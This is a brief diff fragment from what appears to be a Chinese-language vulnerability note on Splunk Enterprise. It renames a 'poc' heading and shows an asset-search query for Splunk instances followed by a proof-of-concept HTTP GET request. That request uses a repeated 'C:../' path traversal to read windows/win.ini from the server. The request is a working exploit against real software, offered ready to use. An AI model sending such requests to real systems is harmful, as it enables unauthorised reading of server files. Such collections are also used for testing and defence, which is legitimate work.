@@ -16,7 +16,7 @@ Splunk Enterprise 是一款强大的数据分析软件，它允许用户从各�
 app="splunk-Enterprise"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini HTTP/1.1
